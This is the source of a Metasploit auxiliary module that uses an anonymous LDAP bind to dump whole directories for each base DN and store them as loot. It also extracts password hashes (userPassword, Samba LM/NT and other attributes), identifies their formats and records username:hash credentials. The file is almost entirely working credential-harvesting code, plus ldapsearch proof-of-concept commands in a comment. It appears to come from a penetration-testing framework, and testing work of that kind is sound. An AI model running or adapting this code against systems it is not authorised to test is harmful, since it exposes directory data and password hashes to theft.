##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::LDAP
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'LDAP Information Disclosure',
        'Description' => %q{
          This module uses an anonymous-bind LDAP connection to dump data from
          an LDAP server. Searching for attributes with user credentials
          (e.g. userPassword).
        },
        'Author' => [
          'Hynek Petrak', # Discovery, hash dumping
          'wvu' # Module
        ],
        'References' => [
        ],
        'DisclosureDate' => '2020-07-23',
        'License' => MSF_LICENSE,
        'Actions' => [
          ['Dump', 'Description' => 'Dump all LDAP data']
        ],
        'DefaultAction' => 'Dump',
        'DefaultOptions' => {
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(636), # SSL/TLS
      OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
      OptString.new('USER_ATTR', [false, 'LDAP attribute(s), that contains username', 'dn']),
      OptString.new('PASS_ATTR', [
        true, 'LDAP attribute, that contains password hashes',
        'userPassword, sambantpassword, sambalmpassword, unixUserPassword, password'
      ])
    ])
  end

  def user_attr
    @user_attr ||= 'dn'
  end

  # PoC using ldapsearch(1):
  #
  # Retrieve root DSE with base DN:
  #   ldapsearch -xb "" -s base -H ldap://[redacted]
  #
  # Dump data using discovered base DN:
  #   ldapsearch -xb bind_dn -H ldap://[redacted] \* + -
  def run
    base_dn_vuln = nil

    ldap_connect do |ldap|
      if ldap.get_operation_result.code == 0
        print_status("#{peer} LDAP connection established")
      else
        # Even if we get "Invalid credentials" error, we may proceed with anonymous bind
        print_error("#{peer} LDAP error #{ldap.get_operation_result.code}: #{ldap.get_operation_result.message}")
      end

      if (base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{base_dn}")
        naming_contexts = [base_dn]
      else
        print_status('Discovering base DN(s) automatically')

        naming_contexts = get_naming_contexts(ldap)
        if naming_contexts.nil? || naming_contexts.empty?
          print_warning('Falling back to an empty base DN')
          naming_contexts = ['']
        end
      end

      @user_attr ||= datastore['USER_ATTR']
      @user_attr ||= 'dn'
      print_status("Taking '#{@user_attr}' attribute as username")

      pass_attr ||= datastore['PASS_ATTR']
      pass_attr_array = pass_attr.split(/[,\s]+/).compact.reject(&:empty?)

      naming_contexts.each do |base_dn|
        print_status("#{peer} Dumping data for base DN='#{base_dn}'")
        Tempfile.create do |f|
          ldap.search(base: base_dn, attributes: %w[* + -]) do |entry|
            base_dn_vuln = base_dn
            f.write("# #{entry.dn}\n")
            f.write(entry.to_ldif.force_encoding('utf-8'))
            f.write("\n")
            pass_attr_array.each do |attr|
              if entry[attr].any?
                process_hash(entry, attr)
              end
            end
          end
          f.rewind
          pillage(f.read, base_dn)
        end
      end
    end

    # We are ok with any entry returned
    unless base_dn_vuln
      print_error("#{peer} seems to be safe")
      return Exploit::CheckCode::Safe
    end

    # HACK: Stash discovered base DN in CheckCode reason
    Exploit::CheckCode::Vulnerable(base_dn_vuln)
  rescue Net::LDAP::Error => e
    print_error("#{e.class}: #{e.message}")
    Exploit::CheckCode::Unknown
  end

  def pillage(ldif, base_dn)
    print_status("Storing LDAP data for base DN='#{base_dn}' in loot")

    ldif_filename = store_loot(
      name, # ltype
      'text/plain', # ctype
      rhost, # host
      ldif, # data
      nil, # filename
      "Base DN: #{base_dn}" # info
    )

    unless ldif_filename
      print_error('Could not store LDAP data in loot')
      return
    end

    print_good("Saved LDAP data to #{ldif_filename}")

  end

  def process_hash(entry, pass_attr_name)
    service_details = {
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      address: rhost,
      port: rport,
      protocol: 'tcp',
      service_name: 'ldap'
    }


    # This is the "username"
    dn = entry[@user_attr].first # .dn

    hash = entry[pass_attr_name].first

    # Skip empty or invalid hashes, e.g. '{CRYPT}x', xxxx, ****
    if hash.nil? || hash.empty? ||
       (hash.start_with?(/{crypt}/i) && hash.length < 10) ||
       hash.start_with?('*****') ||
       hash.start_with?(/xxxxx/i)
      return
    end

    # Remove ldap {crypt} prefix from known hash types
    hash.gsub!(/{crypt}\$1\$/i, '$1$')
    hash.gsub!(/{crypt}\$6\$/i, '$6$')

    # TODO: handle {crypt}taditional_crypt case, i.e. expliitly set the hash format
    # TODO: handle vcenter vmdir binary hash format

    case pass_attr_name.downcase
    when 'sambalmpassword'
      hash_format = 'lm'
    when 'sambantpassword'
      hash_format = 'nt'
    else
      hash_format = identify_hash(hash)
    end

    print_good("Credentials (#{hash_format}) found: #{dn}:#{hash}")

    create_credential(service_details.merge(
      username: dn,
      private_data: hash,
      private_type: :nonreplayable_hash,
      jtr_format: hash_format
    ))
  end

end
